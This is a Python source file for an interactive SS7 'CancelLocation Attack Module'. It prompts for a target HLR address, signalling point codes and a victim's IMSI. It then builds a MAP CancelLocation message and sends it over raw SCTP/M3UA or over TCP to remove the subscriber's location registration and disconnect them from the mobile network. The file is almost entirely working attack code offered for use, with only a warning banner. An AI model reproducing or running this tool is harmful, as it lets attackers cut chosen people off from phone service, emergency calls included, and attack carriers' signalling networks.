#!/usr/bin/env python
"""
CancelLocation Attack Module
Disconnects subscriber by canceling their location registration.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import CancelLocation

def cl_main():
    print("\n" + "=" * 50)
    print(" CancelLocation Attack")
    print(" Subscriber Disconnection")
    print("=" * 50 + "\n")
    
    print("\033[33m[!] WARNING: This disconnects the target from the network.\033[0m\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target HLR IP", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "666"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] Attack Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    cancel_type = int(get_input("Cancellation Type (0=update, 1=withdraw)", "0"))
    
    print("\n" + "=" * 50)
    print(" Building MAP CancelLocation")
    print("=" * 50)
    
    cl = CancelLocation(target_imsi, cancel_type)
    tcap_data = cl.to_tcap_begin()
    
    print(f"[+] Target IMSI: {target_imsi}")
    print(f"[+] MAP Operation: CancelLocation (OpCode: 3)")
    print(f"[+] Cancellation Type: {'updateProcedure' if cancel_type == 0 else 'subscriptionWithdraw'}")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        _sctp_cl(remote_ip, remote_port, opc, dpc, tcap_data)
    else:
        _tcp_cl(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _sctp_cl(remote_ip, remote_port, opc, dpc, tcap_data):
    """SCTP transport."""
    print(f"\n[+] Sending to {remote_ip}:{remote_port} (SCTP)...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            print("[+] Connection established!")
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            if map_ans:
                print("[+] CancelLocation accepted!")
                print("[+] Target subscriber disconnected.")
            else:
                print("[-] No response.")
        else:
            print("[-] SCTP failed. Trying TCP fallback...")
            _tcp_cl(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        print("[*] Trying TCP fallback...")
        _tcp_cl(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_cl(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data, called_ssn=6)

    print("\n" + "=" * 50)
    print(" CancelLocation Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] CancelLocation sent successfully!\033[0m")
        print("\033[32m[+] Target may be disconnected from the network.\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")


if __name__ == "__main__":
    cl_main()
